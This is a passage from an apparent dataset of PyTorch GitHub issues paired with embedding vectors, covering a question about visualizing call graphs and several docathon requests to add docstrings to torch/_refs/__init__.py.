 -2.99637258e-01  6.81186318e-02  6.03450313e-02 -1.17007278e-01
  6.38698647e-03 -6.16907738e-02 -2.97083557e-01  1.12423524e-01
 -8.00331905e-02  7.20093548e-02  2.50691295e-01  9.99398381e-02
  2.08091214e-02  5.42859972e-01  1.47407874e-01  1.26858830e-01
  2.35586226e-01  1.15280889e-01  1.08933724e-01 -1.55166030e-01
 -1.51727140e-01  5.37944019e-01 -9.12615284e-02 -2.65658312e-02
  2.33919978e-01 -5.36775589e-03 -4.03951168e-01  1.89150423e-01
 -3.92207131e-02  9.84347425e-03 -2.24945508e-03 -3.76838446e-02
  8.02577361e-02 -1.74732655e-01  7.58559331e-02 -1.42474681e-01
  2.89316952e-01  4.25072983e-02 -5.38804196e-02  3.31554115e-01
  1.30553856e-01  9.68932807e-02  2.05831349e-01  3.03283989e-01
  1.53231844e-01  3.45269144e-01  1.42370671e-01 -1.74434364e-01
 -1.03205651e-01 -8.79758000e-02 -3.81437540e-01 -1.83855727e-01
  1.44766688e-01 -1.16490386e-03 -2.08981484e-01 -2.15972573e-01
  3.67125235e-02  3.05071995e-02  1.13263413e-01 -8.98915529e-02
 -1.74879998e-01  2.39839241e-01  3.49323928e-01 -1.11349344e-01
 -1.29874349e-01 -7.05441833e-02 -1.71593606e-01 -3.56822371e-01
  3.32912296e-01  5.95551953e-02 -3.50568891e-01 -4.00683135e-02
 -1.23743534e-01 -2.03493893e-01 -1.95407018e-01  1.94118962e-01
  7.82104135e-02 -6.28892034e-02  1.81961223e-01  1.85554504e-01
 -7.46561140e-02 -1.81701273e-01 -1.40628606e-01 -2.16681182e-01
 -2.01728523e-01 -1.29252046e-01 -1.36374552e-02  2.06093416e-01
  1.24905869e-01 -7.78669268e-02 -8.83946419e-02 -1.64923668e-01
  2.07695395e-01  3.13833773e-01  1.76152855e-01 -7.78394938e-02
 -2.10326701e-01 -1.83155552e-01  1.65058002e-02  3.58952790e-01
 -2.17131779e-01 -4.62375998e-01 -1.62353277e-01  1.83726221e-01
  9.47746933e-02  3.39396387e-01  1.33564904e-01 -1.82928797e-02
 -1.81320757e-01 -4.20115888e-03 -1.11351348e-01 -2.80065715e-01
  1.28082126e-01  7.08262529e-03  3.51924539e-01  3.31431389e-01
  4.42477502e-02  7.67061021e-03  1.45031452e-01 -2.93957859e-01
  3.23710263e-01  5.81597865e-01 -2.29991391e-01  1.28528595e-01
  1.25173837e-01  1.07260607e-01 -2.27952674e-01  3.03134024e-01
 -7.52317011e-02 -3.77510116e-02  4.18052077e-01 -3.76396656e-01
 -2.48437747e-03  9.22250152e-02  1.80908144e-01 -1.80858672e-01
  4.01560783e-01 -2.02509873e-02 -1.19916916e-01  2.51052547e-02
  2.06285119e-01 -6.10969588e-02 -1.66796409e-02  9.19537246e-02
  9.49371010e-02 -2.49959260e-01  3.95368598e-02 -1.68508708e-01
 -2.45327741e-01 -5.34245595e-02 -1.76867247e-01  2.48369753e-01
  1.19615600e-01 -3.39433625e-02 -2.68152565e-01  4.48679812e-02
 -2.94356868e-02 -2.03568399e-01  1.90979719e-01 -9.24786180e-03
 -4.79975760e-01 -2.29639202e-01 -5.71682826e-02 -2.79163301e-01
  6.06287085e-02  8.30839761e-03 -6.64940327e-02  3.04625072e-02
  3.61392468e-01 -5.82134128e-01 -8.21237564e-02  2.04381287e-01
 -5.10609820e-02  2.90871263e-01  4.67395894e-02  9.03817266e-02
 -2.44639128e-01  4.57636893e-01  5.98425306e-02  4.85677086e-02
  1.73858747e-01  3.01759578e-02 -3.68032277e-01  7.20979571e-02
  1.75844699e-01  1.22689426e-01 -3.66630912e-01 -4.86528724e-02
 -3.52787077e-02  7.63252750e-02 -1.25392973e-01  2.97838058e-02
 -7.38075972e-02 -3.99015397e-02  1.12215333e-01 -1.62151344e-02
 -8.84681009e-03  2.45739013e-01  9.28250924e-02 -2.66672641e-01
  1.03439420e-01 -1.23948336e-01  4.23001200e-02 -1.78321302e-01
 -2.90442050e-01  1.51030689e-01  9.85668078e-02  3.19436014e-01
  7.09261000e-02  1.74892880e-03 -8.29706341e-02  3.58450525e-02
 -3.90147358e-01  1.40231967e-01 -1.30359977e-01  5.30937493e-01
  7.43237510e-02  1.63163632e-01  4.54229534e-01  4.12985563e-01
 -5.27839184e-01 -3.58882964e-01 -4.29903626e-01 -9.73571241e-02
  3.47437225e-02 -7.65799209e-02 -1.19730547e-01  9.91455242e-02
  7.91046619e-02  2.82252550e-01 -3.90479356e-01 -5.65017723e-02
 -2.04588950e-01  1.41655579e-01  2.64052629e-01 -2.32471913e-01
  2.09942564e-01 -2.62750357e-01  5.94498105e-02 -1.35181285e-02
 -4.20495048e-02 -3.18401232e-02  2.44775772e-01  1.17978141e-01]"
Is there any function in pytorch that can visualize the function calling relationship and the calling relationship of the dynamic link library? ,"### ðŸš€ The feature, motivation and pitch

Is there any function in pytorch that can visualize the function calling relationship and the calling relationship of the dynamic link library?

### Alternatives

_No response_

### Additional context

_No response_",False,"[-0.3863103  -0.04937221 -0.19544898  0.21131893 -0.0574596   0.24370664
  0.32446384 -0.03228576 -0.21655332 -0.10237753  0.13360035 -0.18069638
  0.00819223  0.32942164  0.28856808  0.2931912   0.08484151  0.3251363
 -0.21287672 -0.21940224  0.3701098   0.0593021   0.20809342 -0.09989681
 -0.31754032 -0.1873538   0.06641068 -0.29099193  0.05929656  0.00585526
  0.11415859  0.16509144 -0.16375837 -0.11737944 -0.10570005  0.16234082
 -0.25342074  0.01072118  0.07346791 -0.06255733 -0.10802356  0.34140024
 -0.09791003 -0.07169193 -0.30019405 -0.19264922  0.04146363  0.06391612
 -0.36718777 -0.06930584 -0.13393842 -0.05254344 -0.44084212 -0.14395636
  0.04218999  0.3177663  -0.11017927 -0.08298069 -0.09929375 -0.1599909
  0.0657628   0.06490266  0.24007899  0.22346754 -0.23436505  0.17341915
 -0.12225275  0.30232432  0.2956282  -0.21529274 -0.29735115 -0.05082178
 -0.41863072 -0.38319907  0.06962699  0.04711649 -0.42505205  0.29508477
 -0.20626983  0.12911068  0.22699936 -0.31145883 -0.04663447 -0.09914011
  0.07717146  0.18215753 -0.0452624  -0.16624126  0.03003724  0.02571684
  0.03084744 -0.16577663 -0.39909068  0.16272178 -0.17409663  0.26357064
 -0.23413242 -0.17065972  0.2332134  -0.3165146  -0.35933158  0.09492336
  0.2379726  -0.19214849  0.14652689 -0.06093034 -0.03258377  0.25781488
  0.18520278  0.12831718  0.00355084 -0.05610395  0.1285992   0.16964827
 -0.07069451  0.25241596  0.4147338  -0.25223726  0.27561194 -0.02733411
  0.29669735  0.00957022  0.051629    0.33457363 -0.10269307 -0.06203869
 -0.19032255  0.22280273  0.27811855 -0.01935237  0.25924808  0.23649101
  0.3860188   0.24354374 -0.0227506  -0.2738955  -0.08923855 -0.17745021
 -0.44407094  0.09923791 -0.13509446 -0.16558439 -0.19232814 -0.4436705
 -0.20858048  0.21359873 -0.06833485  0.08826538 -0.0473172   0.3373801
  0.10275169  0.14924745  0.07230461  0.34354553  0.15864325  0.09048767
  0.07024119 -0.12010464  0.1631604  -0.2874902  -0.00602362  0.10195493
  0.03120209 -0.21643174 -0.38952923 -0.07662328 -0.11538393 -0.01223384
 -0.04155317 -0.24229202 -0.31887743  0.03212258 -0.27409324 -0.18669769
  0.15880908  0.23708819 -0.3669292  -0.23909396 -0.01878388  0.22049493
  0.2185752   0.26779962  0.03149069 -0.10425644 -0.3027264   0.18234938
  0.14929797  0.17693138  0.10893484 -0.0080595   0.08997449 -0.15057166
  0.17590535 -0.04637981  0.04404783 -0.15937527  0.02579113  0.06478471
  0.08605269  0.16232288  0.15983787 -0.3121159  -0.1442114   0.21846743
 -0.15630352  0.02662092 -0.08784828  0.28638536 -0.35156912 -0.0946805
 -0.01634469 -0.062188   -0.15433037  0.03711369 -0.24339947  0.0181169
 -0.22730196  0.07014482 -0.08169541  0.08549541 -0.06033272  0.08063219
  0.2791172  -0.2154478   0.33783075  0.24787585 -0.08024091  0.21107589
  0.22068173 -0.08324288 -0.01611719 -0.37436712  0.27219087  0.2535327
  0.15832399  0.0748675  -0.15968588  0.00591322  0.1269468  -0.00726904
 -0.19742966 -0.11223835 -0.16555363 -0.00746262  0.00207974 -0.03636154
 -0.19986868 -0.25849864 -0.11690947 -0.1263797  -0.08930556 -0.37728643
  0.34582162  0.12788549  0.37367445  0.1986588  -0.04185813  0.08821426
  0.21545771  0.07946195  0.08129043  0.021351    0.22690304  0.16613552
  0.44606102  0.03962679 -0.01909921  0.10317259  0.18462726 -0.06762206
 -0.1424355  -0.431229   -0.21714316  0.04654928  0.09787918  0.22809348
  0.13426246 -0.34662545  0.08698495  0.4073279   0.1793946   0.01508237
  0.01214588  0.11995233 -0.10362405 -0.29693297 -0.10331418  0.23109017
 -0.2841484  -0.01232577 -0.11672684 -0.2147856   0.06286206 -0.12804142
  0.08440943  0.1833521   0.02906595  0.20536546  0.11867404  0.20971146
 -0.13819209  0.06383231  0.18656395 -0.09863453 -0.02633478  0.18488035
  0.36635566 -0.38457277  0.31940782 -0.28012952 -0.02430431  0.4228457
  0.10237083  0.19778414 -0.37250265 -0.16568196 -0.4710311   0.3704578
  0.22470419  0.11853988 -0.22631875 -0.01535934 -0.26779708 -0.01173734
  0.08072709  0.1578812   0.34018224  0.05276841 -0.18064928  0.22630733
  0.13650784  0.09134552  0.15229805  0.28159383  0.17953384 -0.10409377
 -0.2680783  -0.18758135 -0.06834569 -0.11469294 -0.17502348 -0.03650395
 -0.11529068 -0.0198047   0.14245479 -0.23788376 -0.08444829  0.45120454
 -0.2370566   0.02739643  0.26726913  0.15417163 -0.4334192   0.17064993
 -0.18940373  0.12695293  0.19523352 -0.20488256 -0.28095865  0.42058215
 -0.14383616  0.11945535 -0.00595665  0.23710047 -0.05416121 -0.00059706
  0.00708122 -0.5405104  -0.1762238   0.5445249  -0.34099135  0.12483429
 -0.18240234 -0.12698412 -0.04498479  0.04177956  0.13047947  0.20821187
 -0.14610833 -0.09596331 -0.21654354  0.3280568  -0.04521871 -0.02794312]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1663
- **File**: `./torch/_refs/__init__.py`, **Line**: 1672
- **File**: `./torch/_refs/__init__.py`, **Line**: 1682
- **File**: `./torch/_refs/__init__.py`, **Line**: 1703
- **File**: `./torch/_refs/__init__.py`, **Line**: 1742
- **File**: `./torch/_refs/__init__.py`, **Line**: 1778

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1616
- **File**: `./torch/_refs/__init__.py`, **Line**: 1629
- **File**: `./torch/_refs/__init__.py`, **Line**: 1638
- **File**: `./torch/_refs/__init__.py`, **Line**: 1646
- **File**: `./torch/_refs/__init__.py`, **Line**: 1654

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
 -3.46054673e-01 -5.19460201e-01 -8.21878314e-02 -3.34102176e-02
 -9.31323022e-02 -2.08592728e-01 -2.14449376e-01 -3.11297923e-01
  2.02441871e-01  3.26310277e-01 -4.53196108e-01  1.75224040e-02
 -7.74733126e-02  1.97217181e-01 -4.23801422e-01  1.70498848e-01
  1.85439065e-02  2.75060654e-01  2.34175518e-01 -2.64781211e-02
  1.79726422e-01 -1.34660363e-01 -2.40009457e-01 -7.81643987e-02
 -9.26376730e-02  1.32006198e-01  5.68260103e-02  3.22780199e-03
  1.77675746e-02  3.05755362e-02 -1.03349000e-01 -3.28961790e-01
 -3.57606292e-01  5.05570546e-02  7.75654614e-02  5.37099503e-03
 -5.09074479e-02  6.62788302e-02  6.24384508e-02  1.25254378e-01
  1.69841722e-02 -3.90906930e-01  1.22695707e-01  2.70669609e-01
  4.22088027e-01  3.83970439e-01  7.85249472e-02 -7.29241371e-02
 -2.95089543e-01  1.17290206e-01  1.88682586e-01 -1.00878112e-01
  1.28416359e-01  2.08841518e-01  1.34372920e-01 -7.11789355e-02
  1.20860748e-01 -1.37122020e-01 -1.46252140e-01  1.56555712e-01
  3.48669849e-02  2.60239780e-01 -3.51073265e-01  3.29828799e-01
 -3.35057199e-01  2.23408356e-01  8.14721808e-02 -3.19230836e-04
  5.90455770e-01  7.43510276e-02 -2.47388929e-01 -4.10894930e-01
 -2.54831612e-01  4.10358831e-02 -9.72964764e-02  2.83683658e-01
  1.45393431e-01 -3.16430092e-01 -2.77405083e-01  4.42191809e-01
 -2.84133162e-02 -1.43107206e-01  1.23514019e-01 -1.13313206e-01
 -3.01838994e-01 -1.26086116e-01  2.12404560e-02 -3.30847651e-01
  1.82728812e-01  5.98171428e-02 -2.36590534e-01  1.55993253e-01
 -9.27777812e-02  8.49202424e-02 -1.16443515e-01 -2.72273332e-01
  7.29686499e-01 -1.18528768e-01  2.52392471e-01  7.84103051e-02
 -8.74011666e-02 -1.66017056e-01 -2.93148041e-01  2.14035213e-02
 -2.84302950e-01 -4.78951633e-02 -7.41205215e-02 -1.08915105e-01
  1.53924555e-01 -1.30165756e-01 -1.17874764e-01 -1.82245269e-01
 -1.50156379e-01  1.10511541e-01 -2.01839596e-01 -3.27361405e-01
 -1.21010169e-02  5.02802432e-02  3.23028356e-01  1.80900425e-01
 -3.43927205e-01 -9.02872831e-02 -8.52345824e-02 -5.63989952e-02
 -5.44571318e-04  2.31372386e-01 -1.60994947e-01  3.46990049e-01
  4.42163050e-01 -2.11721510e-02  7.92802051e-02  7.99374431e-02
 -2.00454891e-01 -2.61788368e-01  2.52169013e-01 -2.48608530e-01
  2.62872279e-01  3.13544691e-01  1.42012209e-01  9.34583396e-02
  1.34801790e-01 -1.76309496e-01 -4.65184487e-02 -6.49117902e-02
 -9.12238061e-02 -3.39796245e-02 -4.25603151e-01  4.14306410e-02
  2.20762670e-01 -1.80100292e-01  1.46412887e-02 -1.16157606e-01
 -1.57549933e-01 -1.30525544e-01 -2.15643167e-01 -3.90693769e-02
  1.24601498e-01  3.00489590e-02  1.00226596e-01 -1.75688773e-01
 -3.77082676e-02  5.18131740e-02  4.60446000e-01  1.34565353e-01
 -2.70891666e-01 -1.84286818e-01 -1.67791098e-01  2.82064021e-01
  7.01599419e-02  1.44059449e-01  5.95807135e-02  1.66874856e-01
  3.21703196e-01 -1.48408785e-01  2.99559981e-01  4.83371437e-01
 -2.94880897e-01  3.29860985e-01 -2.71542668e-01  6.76554963e-02
 -7.56690279e-04  3.74248624e-01 -2.49428868e-01  4.50944304e-02
 -5.45853041e-02 -1.05682798e-01 -5.84659278e-01  1.33849308e-03
  1.31237030e-01 -5.80094522e-03 -5.93638957e-01  2.47729510e-01
 -4.50383663e-01 -3.38510990e-01  9.75767225e-02  1.27070129e-01
 -3.29743624e-01 -2.07209170e-01 -1.32058322e-01 -4.18188311e-02
  1.11826517e-01  2.07104608e-02 -1.11313827e-01 -9.57485735e-02
 -6.57082945e-02  8.82218629e-02  1.03920855e-01 -1.22595295e-01
 -1.80441841e-01 -1.83621123e-02  1.24335945e-01  5.10487199e-01
 -1.58402175e-02  1.20340332e-01  4.48934972e-01  3.23469698e-01
 -2.40006894e-01 -8.22252594e-03 -1.75762966e-01  2.68034577e-01
  2.04680413e-02  3.81613851e-01 -3.48793566e-02  5.10810137e-01
 -3.17896187e-01  1.21100377e-02 -2.34484822e-01  6.06141649e-02
 -5.11811152e-02 -1.96889818e-01  4.39819917e-02  1.54068649e-01
  8.84329826e-02  1.30695269e-01 -1.19699482e-02  7.49131590e-02
  9.34201628e-02  3.72928739e-01  2.84382887e-02  1.74105018e-01
  4.19823974e-01 -7.48999417e-02  1.12520784e-01 -3.09092581e-01
 -3.31357360e-01 -5.09998165e-02  3.18126649e-01  2.31914520e-01]"
Add Docstrings to ./torch/_refs/__init__.py module: docs triaged medium docathon-h2-2023,"Add docstrings on the following lines. Follow these [docstring guidelines](https://github.com/pytorch/pytorch/blob/main/CONTRIBUTING.md#docstring-type-formatting). A docstring should have:
* A short one-sentence description in imperative mode.
* A longer description.
* A list of associated Args.
* A return value (for functions)
* An example
Follow the existing patterns in the file you are editing. After adding the docstring, run:
```
lintrunner -a
```
- **File**: `./torch/_refs/__init__.py`, **Line**: 1526
- **File**: `./torch/_refs/__init__.py`, **Line**: 1584
- **File**: `./torch/_refs/__init__.py`, **Line**: 1596
- **File**: `./torch/_refs/__init__.py`, **Line**: 1604
- **File**: `./torch/_refs/__init__.py`, **Line**: 1616

cc @carljparker",False,"[-7.23148286e-02  3.89273316e-02  4.55345958e-03 -8.91592950e-02
 -9.43444818e-02  3.50120012e-04 -1.50771439e-01  6.05069622e-02
 -3.33087742e-01  1.57290041e-01 -3.24731022e-01  2.87611425e-01
 -3.66544351e-02  1.40772551e-01 -7.87723064e-02  4.59123738e-02
 -2.95520425e-01 -4.74924594e-02 -9.29562449e-02  1.30999774e-01
  1.53009102e-01  5.55932403e-01 -2.14208364e-01  8.78652483e-02
  1.77175790e-01  7.18023404e-02 -4.81935740e-01 -2.29387134e-01
 -3.07155270e-02  1.64099142e-01  1.84926197e-01  2.87526309e-01
 -6.94214851e-02  5.46153970e-02  2.56145358e-01  1.32819593e-01
  2.22494304e-01  2.73264468e-01  9.21734516e-03  6.79727271e-02
  5.62386885e-02  2.40388438e-02 -2.60687739e-01  3.09935093e-01
 -9.66107175e-02 -3.99327099e-01 -2.78906256e-01  5.15076295e-02
 -1.15082920e-01  1.62481785e-01 -5.64629555e-01 -4.48421724e-02
 -4.39615309e-01  3.13579977e-01 -1.01640053e-01 -1.51568532e-01
 -1.24524876e-01  4.40931082e-01  2.13774934e-01 -2.16325581e-01
  6.25469722e-04  5.63943684e-02  2.10718423e-01  2.32813239e-01
 -1.36653841e-01  3.40682089e-01 -1.60915211e-01  2.55607575e-01
  2.43899465e-01  8.62871259e-02 -1.85048997e-01 -1.31979838e-01
 -2.02002674e-01 -2.56226331e-01 -1.37861390e-02 -1.99848190e-02
 -2.80462503e-01  1.56970188e-01 -4.31293212e-02 -2.23183453e-01
 -6.42524809e-02  4.21404615e-02 -1.38538644e-01  3.04147840e-01
  2.33567711e-02 -6.83726370e-02  1.51702046e-01 -6.15043044e-02
  2.36955956e-01  1.30055472e-01  1.38886929e-01 -2.29337066e-01
  3.33808810e-01  2.40306780e-01  1.35081217e-01  1.06634006e-01
  6.47737831e-03 -4.43778560e-02  1.02669150e-02 -2.24683940e-01
 -1.75663263e-01 -4.20530200e-01 -6.74690902e-02 -1.30486906e-01
  4.70483899e-02 -3.23137105e-01  5.91735318e-02  5.74710891e-02
  9.66773257e-02 -1.97599202e-01  2.02407941e-01  7.33903870e-02
 -3.57933901e-03 -2.92372286e-01 -1.27421379e-01  8.95231366e-02
  9.04124882e-03 -1.36015117e-01  1.78599972e-02  1.91367209e-01
  1.99953884e-01  3.56821716e-01 -6.73655123e-02  1.57923847e-01
  1.32369697e-01  8.11474025e-02  2.10293010e-02  4.24529538e-02
  1.59240454e-01  3.66523974e-02 -7.50637613e-03  4.44512889e-02
 -1.78625733e-02  2.18076244e-01  2.90850967e-01 -8.94843042e-02
